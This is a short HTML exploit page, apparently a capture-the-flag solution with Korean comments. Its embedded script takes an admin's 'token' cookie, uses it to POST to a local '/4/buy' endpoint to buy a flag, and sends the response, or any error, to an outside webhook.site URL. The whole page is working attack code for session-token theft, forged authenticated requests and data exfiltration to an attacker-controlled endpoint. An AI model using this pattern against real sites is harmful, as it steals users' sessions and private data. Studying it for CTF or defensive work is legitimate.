<!DOCTYPE html>
<html>
<head>
  <title>Exploit</title>
</head>
<body>
  <script>
    // admin이 localhost에서 로그인한 후 이 페이지로 리다이렉트됨
    // 쿠키에서 token 추출
    const token = document.cookie.split('token=')[1]?.split(';')[0];
    
    // /4/buy 호출해서 Flag 구매
    fetch('http://localhost:3000/4/buy', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'token': token
      }
    })
    .then(r => r.json())
    .then(data => {
      // Flag를 webhook으로 전송
      fetch('https://webhook.site/49a58c37-eb88-47dc-aa89-3931c4df2c95?flag=' + encodeURIComponent(data.data));
    })
    .catch(e => {
      // 에러도 webhook으로 전송
      fetch('https://webhook.site/49a58c37-eb88-47dc-aa89-3931c4df2c95?error=' + encodeURIComponent(e.toString()));
    });
  </script>
</body>
</html>
